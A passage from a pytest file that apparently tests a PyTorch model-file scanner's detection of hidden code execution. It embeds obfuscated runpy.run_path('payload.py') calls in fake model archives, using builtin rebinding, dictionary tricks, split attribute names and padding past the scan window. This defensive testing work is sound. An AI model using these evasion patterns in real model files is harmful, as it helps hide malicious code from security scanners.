            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nbuiltins.vars = lambda obj: {}\n"
            b"vars(builtins).update(dict=real)\n"
            b"builtins.dict.update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal_getattr = builtins.getattr\nbuiltins.getattr = lambda *args: Safe\n"
            b"builtins.getattr = real_getattr\n"
            b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal_getattr = builtins.getattr\nbuiltins.getattr = lambda *args: Safe\n"
            b"real_getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal_getattr = builtins.getattr\nbuiltins.getattr = lambda *args: Safe\n"
            b"if globals().get('enabled'):\n    builtins.getattr = real_getattr\n"
            b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal_getattr = builtins.getattr\nbuiltins.getattr = lambda *args: Safe\n"
            b"enabled = True\nif globals().get('enabled'):\n    real_getattr = lambda *args: Safe\n"
            b"builtins.getattr = real_getattr\n"
            b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal_getattr = builtins.getattr\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_getattr = lambda *args: Safe\n"
            b"real_getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal_dict = builtins.dict\nbuiltins.dict = Safe\n"
            b"real_vars = builtins.vars\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
            b"real_vars(builtins).update(dict=real_dict)\n"
            b"builtins.dict.update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal_dict = builtins.dict\nbuiltins.dict = Safe\n"
            b"real_vars = builtins.vars\nenabled = True\n"
            b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
            b"namespace = real_vars(builtins)\nnamespace.update(dict=real_dict)\n"
            b"builtins.dict.update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\n"
            b"mapping = builtins.__dict__\nput = mapping.__setitem__\nput('dict', real)\n"
            b"builtins.dict.update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\n"
            b"real.__setitem__(builtins.__dict__, 'dict', real)\n"
            b"builtins.dict.update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nput = real.__setitem__\n"
            b"put(builtins.__dict__, 'dict', real)\n"
            b"builtins.dict.update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"setattr(rp, 'run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nrestore = builtins.setattr\nrestore(rp, 'run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"dict.__setitem__(rp.__dict__, 'run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"put = dict.__setitem__\nput(rp.__dict__, 'run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nnamespace = builtins.vars(rp)\nput = namespace.__setitem__\nput('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nnamespace = builtins.vars(rp)\nput = namespace.__setitem__\n"
            b"relay = put\nrelay('run_path', original)\n",
            True,
        ),
        (b"", b"put = dict.__setitem__\nput(rp.__dict__, 'run_path', print)\n", False),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"mapping = rp.__dict__\nmapping |= {'run_path': original}\n",
            True,
        ),
        (b"", b"mapping = rp.__dict__\nmapping |= {'run_path': print}\n", False),
        (b"", b"mapping = rp.__dict__\nmapping['run_path'] = print\n", False),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"mapping = rp.__dict__\nmapping['run_path'] = original\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"rp.__dict__.update([('run_path', original)])\n",
            True,
        ),
        (b"", b"rp.__dict__.update([('run_path', print)])\n", False),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"mapping = rp.__dict__\nrestore = mapping.update\nrestore([('run_path', original)])\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"rp.__dict__.__ior__({'run_path': original})\n",
            True,
        ),
        (b"", b"rp.__dict__.__ior__({'run_path': print})\n", False),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"dict.__ior__(rp.__dict__, {'run_path': original})\n",
            True,
        ),
        (b"", b"dict.__ior__(rp.__dict__, {'run_path': print})\n", False),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"del rp.run_path\nrp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (b"", b"del rp.run_path\nrp.__dict__.setdefault('run_path', print)\n", False),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"del rp.run_path\ndict.setdefault(rp.__dict__, 'run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"del rp.run_path\nput = rp.__dict__.setdefault\nput('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"del rp.__dict__['run_path']\nrp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (b"", b"del rp.__dict__['run_path']\nrp.__dict__.setdefault('run_path', print)\n", False),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"rp.__dict__.pop('run_path')\nrp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (b"", b"rp.__dict__.pop('run_path')\nrp.__dict__.setdefault('run_path', print)\n", False),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"del rp.run_path\nput = dict.setdefault\nput(rp.__dict__, 'run_path', original)\n",
            True,
        ),
        (b"", b"del rp.run_path\nput = dict.setdefault\nput(rp.__dict__, 'run_path', print)\n", False),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"del rp.run_path; rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"(rp.__dict__.pop('run_path'), rp.__dict__.setdefault('run_path', original))\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"dict.__delitem__(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"remove = rp.__dict__.pop\nremove('run_path')\nrp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"remove = dict.pop\nremove(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"remove = dict.__delitem__\nremove(rp.__dict__, 'run_path')\n"
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"delattr(rp, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (b"", b"dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', print)\n", False),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"del rp.run_path\nrp.__dict__.setdefault('run_path', original)\n"
            b"runner = rp.run_path\nrunner('payload.py')\nrp.run_path = print\n",
            True,
        ),
        (b"", b"rp.run_path = print\nrp.__dict__.setdefault('run_path', original)\n", False),
        (
            b"",
            b"import builtins\nnamespace_of = builtins.vars\nenabled = True\n"
            b"if globals().get('enabled'):\n    namespace_of = lambda obj: {}\n"
            b"mapping = namespace_of(rp)\nmapping.update(run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nnamespace_of = builtins.vars\nenabled = True\n"
            b"if globals().get('enabled'):\n    namespace_of = lambda obj: {}\n"
            b"mapping = namespace_of(rp)\nrestore = mapping.update\nrestore(run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nnamespace_of = builtins.vars\nenabled = True\n"
            b"if globals().get('enabled'):\n    namespace_of = lambda obj: {}\n"
            b"mapping = namespace_of(rp)\nsecond = mapping\nsecond.update(run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nread_descriptor = builtins.getattr\nenabled = True\n"
            b"if globals().get('enabled'):\n    read_descriptor = lambda *args: Safe\n"
            b"restore = read_descriptor(builtins, 'dict').update\nrestore(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nread_descriptor = builtins.getattr\nenabled = True\n"
            b"if globals().get('enabled'):\n    read_descriptor = lambda *args: Safe\n"
            b"restore = read_descriptor(builtins, 'dict').update\napply = restore\n"
            b"apply(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nbuiltins.getattr = lambda *args: Safe\nbuiltins.getattr = getattr\n"
            b"builtins.getattr(builtins, 'dict').update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\ngetattr = lambda *args: Safe\ndel getattr\n"
            b"getattr(builtins, 'dict').update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"",
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nvars = lambda obj: {}\ndel vars\nvars(builtins).update(dict=Safe)\n"
            b"builtins.dict.update(rp.__dict__, run_path=print)\n",
            True,
        ),
        (b"", b"if False:\n    dict = object\ndict.update(rp.__dict__, run_path=print)\n", False),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"if False:\n    dict = object\ndict.update(rp.__dict__, run_path=original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\ndict.pop(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\nremove = dict.pop\nremove(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"import builtins\noriginal = rp.run_path\nrp.run_path = print\nremove = builtins.dict.pop\n"
            b"remove(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"import builtins as bi\noriginal = rp.run_path\nrp.run_path = print\n"
            b"bi.dict.pop(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"import builtins\noriginal = rp.run_path\nrp.run_path = print\n"
            b"real_dict = builtins.dict\nreal_dict.pop(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"import builtins\noriginal = rp.run_path\nrp.run_path = print\n"
            b"real_dict = builtins.dict\nremove = real_dict.pop\nremove(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"from builtins import dict as real_dict\noriginal = rp.run_path\nrp.run_path = print\n"
            b"real_dict.pop(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"from builtins import (\n    dict as real_dict,\n)\n"
            b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"from builtins import (\n    dict as real_dict,\n    len as spare,\n)\n"
            b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"pass; from builtins import dict as real_dict\n"
            b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"0; from builtins import dict as real_dict\n"
            b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"if True: from builtins import dict as real_dict\n"
            b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"if True:\n    from builtins import dict as real_dict\n"
            b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"enabled = True\nif enabled:\n    from builtins import dict as real_dict\n"
            b"original = rp.run_path\nrp.run_path = print\nreal_dict.pop(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"from builtins import (\n    dict as real_dict,\n    len as spare,\n)\n"
            b"real_dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"from builtins import dict as real_dict, \\\n    len as spare\n"
            b"real_dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"from builtins import dict as real_dict; pass\nreal_dict.pop(rp.__dict__, 'run_path')\n"
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"pass; from builtins import dict as real_dict\nreal_dict.pop(rp.__dict__, 'run_path')\n"
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"0; from builtins import dict as real_dict\nreal_dict.pop(rp.__dict__, 'run_path')\n"
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"if True: from builtins import dict as real_dict\nreal_dict.pop(rp.__dict__, 'run_path')\n"
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"if True:\n    from builtins import dict as real_dict\n"
            b"real_dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"enabled = True\nif enabled:\n    from builtins import dict as real_dict\n"
            b"real_dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"enabled = False\nglobals()['enabled'] = True\nif enabled:\n"
            b"    from builtins import dict as real_dict\nreal_dict.pop(rp.__dict__, 'run_path')\n"
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"enabled = True\nglobals = lambda: {}\nglobals()['enabled'] = False\nif enabled:\n"
            b"    from builtins import dict as real_dict\nreal_dict.pop(rp.__dict__, 'run_path')\n"
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"enabled = False\nglobals = lambda: {}\ndel globals\nglobals()['enabled'] = True\nif enabled:\n"
            b"    from builtins import dict as real_dict\nreal_dict.pop(rp.__dict__, 'run_path')\n"
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\n",
            b"enabled = False\nglobals()['globals'] = lambda: {}\ndel globals\n"
            b"globals()['enabled'] = True\nif enabled:\n    from builtins import dict as real_dict\n"
            b"real_dict.pop(rp.__dict__, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
        (
            b"original = rp.run_path\nrp.run_path = print\nremove = dict.pop\nrelay = remove\n"
            b"relay(rp.__dict__, 'run_path')\n",
            b"rp.__dict__.setdefault('run_path', original)\n",
            True,
        ),
    ],
)
def test_pytorch_zip_preserves_latest_late_runpy_member_state(
    tmp_path: Path, prefix_state: bytes, late_state: bytes, expect_finding: bool
) -> None:
    zip_path = tmp_path / "model.pt"
    padding_line = b"# pad\n"
    padding = padding_line * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8)
    payload = (
        b"\x00\xffimport runpy as rp\n"
        + prefix_state
        + padding
        + late_state
        + b"((rp).run_path)('payload.py')\n"
        + padding
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))
    has_dynamic_failure = any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )

    assert has_dynamic_failure is expect_finding


@pytest.mark.parametrize(
    ("late_state", "call_line"),
    [
        (b"mod = rp\nmod.run_path = original\n", b"((mod).run_path)('payload.py')\n"),
        (b"mod = rp\nmod.run_path = original\n", b"((rp).run_path)('payload.py')\n"),
        (b"\x00\xffrp.run_path = original\n\x00\xff", b"((rp).run_path)('payload.py')\n"),
        (b"\x00\xffrp.run_path = original\n", b"\x00\xff(\n rp.run_path\n)('payload.py')\n"),
        (b"\x00\xffrp.run_path = original\n", b"\x00\xffrp \\\n .run_path('payload.py')\n"),
        (
            b"\x00\xffrp.run_path = original\n",
            b"\x00\xffgetattr \\\n (rp, 'run_path')('payload.py')\n",
        ),
        (
            b"\x00\xffrp.run_path = original\n",
            b"\x00\xffgetattr(rp, 'run_path')('payload.py')\n",
        ),
        (
            b"\x00\xffrp.run_path = original\n",
            b"\x00\xffgetattr(rp, 'run_' + 'path')('payload.py')\n",
        ),
        (
            b"\x00\xffrp.run_path = original\n",
            b"\x00\xffgetattr \\\n (rp, 'run_' + 'path')('payload.py')\n",
        ),
        (
            b"\x00\xffrp.run_path = original\n",
            b"\x00\xffgetattr(\n rp, 'run_' + 'path'\n)('payload.py')\n",
        ),
        (b"\x00\xffrp.__dict__['run_path'] = original\n", b"((rp).run_path)('payload.py')\n"),
        (b"\x00\xffvars(rp).update(run_path=original)\n", b"((rp).run_path)('payload.py')\n"),
        (
            b"\x00\xffrp.__dict__.update({'other': print, 'run_path': original})\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"\x00\xffvars(rp).update(other=print, run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (b"\x00\xffrp.__dict__.update(**{'run_path': original})\n", b"((rp).run_path)('payload.py')\n"),
        (
            b"\x00\xffrp.__dict__.update({'other': {'x': print}, 'run_path': original})\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"restore = rp.__dict__.update\n\x00\xffrestore(run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (b"\x00\xffdict.update(rp.__dict__, run_path=original)\n", b"((rp).run_path)('payload.py')\n"),
        (
            b"\x00\xffrestore = dict.update\nrestore(rp.__dict__, run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"import builtins\n\x00\xffrestore = builtins.dict.update\nrestore(rp.__dict__, run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"ns = rp.__dict__\n\x00\xffns.update(run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"restore = vars(rp).update\n\x00\xffrestore(run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"\x00\xffns = rp.__dict__\nns.update(run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"\x00\xffrestore = vars(rp).update\nrestore(run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"mod = rp\nns = mod.__dict__\nns.update(run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"mod = rp\nrestore = vars(mod).update\nrestore(run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"mod = rp\nmapping = mod.__dict__\nrestore = mapping.update\nrestore(run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"mod = rp\nmapping = mod.__dict__\nsecond = mapping\nrestore = second.update\n"
            b"restore(run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"mod = rp\nmapping = mod.__dict__\nrestore = mapping.update\napply = restore\napply(run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (b"\x00\xffrp.__dict__['run_' + 'path'] = original\n", b"((rp).run_path)('payload.py')\n"),
        (b"\x00\xffrp.__dict__['run' + '_path'] = original\n", b"((rp).run_path)('payload.py')\n"),
        (
            b"\x00\xffrp.__dict__[\n    'run' + '_path'\n] = original\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"\x00\xffrp.__dict__.update(\n    **{'run' + '_path': original}\n)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"\x00\xffrp.__dict__.__setitem__('run_' + 'path', original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"if globals().get('enabled'):\n    rp.run_path = original\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"if globals().get('enabled'):\n    restore = dict.update\nrestore(rp.__dict__, run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"class Restore:\n    rp.run_path = original\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"restore = (\n    dict.update\n)\nrestore(rp.__dict__, run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"import builtins\nrestore = getattr(builtins, 'dict').update\nrestore(rp.__dict__, run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nmapping = builtins.__dict__\n"
            b"restore = mapping.update\nrestore(dict=real)\n"
            b"builtins.dict.update(rp.__dict__, run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"import builtins\nnamespace_of = builtins.vars\nbuiltins.vars = lambda obj: {}\n"
            b"namespace_of(rp).update(run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"import builtins\nnamespace_of = builtins.vars\nbuiltins.vars = lambda obj: {}\n"
            b"mapping = namespace_of(rp)\nrestore = mapping.update\nrestore(run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\n"
            b"if globals().get('enabled'):\n    mapping = builtins.__dict__\n"
            b"mapping.update(dict=real)\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"class Restore:\n    restore = dict.update\n    restore(rp.__dict__, run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
            b"        pass\nreal = builtins.dict\nbuiltins.dict = Safe\nmapping = builtins.__dict__\n"
            b"restore = mapping.update\nif globals().get('enabled'):\n    restore = Safe.update\n"
            b"restore(dict=real)\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
            b"((rp).run_path)('payload.py')\n",
        ),
        (
            b"harmless = None\nfield: setattr(rp, 'run_path', original) = harmless\n",
            b"rp.run_path('payload.py')\n",
        ),
    ],
)
def test_pytorch_zip_detects_possible_late_runpy_member_restore(
    tmp_path: Path, late_state: bytes, call_line: bytes
) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = (
        b"\x00\xffimport runpy as rp\noriginal = rp.run_path\nrp.run_path = print\n"
        + padding
        + late_state
        + call_line
        + padding
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_pytorch_zip_preserves_postponed_late_annotated_runpy_restore(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(b"# pad\n") + 8)
    payload = (
        b"\x00\xfffrom __future__ import annotations\nimport runpy as rp\n"
        + padding
        + b"original = rp.run_path\nrp.run_path = print\nharmless = None\n"
        + b"field: setattr(rp, 'run_path', original) = harmless\nrp.run_path('safe')\n"
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "future_import",
    [
        b"from __future__ import (annotations)\n",
        b"from __future__ import (\n    annotations\n)\n",
    ],
)
def test_pytorch_zip_preserves_noncanonical_postponed_late_annotated_runpy_restore(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, future_import: bytes
) -> None:
    monkeypatch.setattr(jit_script_module, "_EMBEDDED_PYTHON_SCAN_WINDOW_BYTES", 4096)
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(b"# pad\n") + 8)
    payload = (
        b"\x00\xff"
        + future_import
        + b"import runpy as rp\n"
        + padding
        + b"original = rp.run_path\nrp.run_path = print\nharmless = None\n"
        + b"field: setattr(rp, 'run_path', original) = harmless\nrp.run_path('safe')\n"
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "future_import",
    [
        b"from __future__ import (annotations)\n",
        b"from __future__ import (\n    annotations\n)\n",
    ],
)
def test_pytorch_zip_detects_noncanonical_postponed_late_annotated_runpy_mutation(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, future_import: bytes
) -> None:
    monkeypatch.setattr(jit_script_module, "_EMBEDDED_PYTHON_SCAN_WINDOW_BYTES", 4096)
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(b"# pad\n") + 8)
    payload = (
        b"\x00\xff"
        + future_import
        + b"import runpy as rp\n"
        + padding
